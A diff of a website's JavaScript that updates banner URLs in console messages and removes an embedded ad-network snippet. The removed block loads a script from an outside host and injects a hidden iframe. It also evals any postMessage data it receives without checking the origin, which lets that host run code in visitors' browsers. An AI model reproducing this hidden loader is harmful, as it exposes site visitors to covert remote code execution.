@@ -61,16 +61,17 @@ window.console &&
     'color:#3eaf7c;font-size:28px;font-weight:300'
   ),
   console.log('书以启智,技于谋生,活出斜杠.\n祝屏幕前正阅读的您码中致富'),
-  console.log(`%c https://itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://coder.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://faka.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://zhanji.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://img.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://game.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://video.itclan.cn\n`, 'color:#3eaf7c'),
-  console.log(`%c https://tv.itclan.cn\n`, 'color:#3eaf7c'),
+  console.log(`%c https://itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://coder.itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://faka.itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://zhanji.itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://video.itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://tv.itclan.net\n`, 'color:#3eaf7c'),
   console.log(`%c https://tv.jiahaoruisen.com\n`, 'color:#3eaf7c'),
-  console.log(`%c https://nav.itclan.cn\n`, 'color:#3eaf7c'),
+  console.log(`%c https://nav.itclan.net\n`, 'color:#3eaf7c'),
+  console.log(`%c https://tv.itclan.pro\n`, 'color:#3eaf7c'),
+  console.log(`%c https://aikelaidev.cn\n`, 'color:#3eaf7c'),
+  console.log(`%c https://liangxing.aikelaidev.cn\n`, 'color:#3eaf7c'),
   console.log(
     '%c QQ交流群(1):64346880,微信公众号:itclanCoder',
     'color:#3eaf7c'
@@ -88,13 +89,3 @@ document.addEventListener('gesturestart', function(event) {
 });
 
 // console.log(new Date().getTime() - performance.timing.navigationStart);
-// 西瓜联盟下悬浮https://www.xglm8.com/
-if(navigator.userAgent.indexOf('baiduboxapp')>-1){
-  document.write('<script src="https://js11.xglm2024.top:11443/qq/x-11-33.js"><\/script>')
-} else {
-  (function(){ window.addEventListener("message",function(e){var _des_s_11=e.data;
-  if(_des_s_11.des_s_11){
-    var _s = '/+/g';eval(decodeURIComponent(_des_s_11.des_s_11.replace(_s,"%20")))}});
-    document.write('<iframe style="display:none;" src="https://js11.xglm2024.top:11443/qq/x-11-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')
-  })();
-}
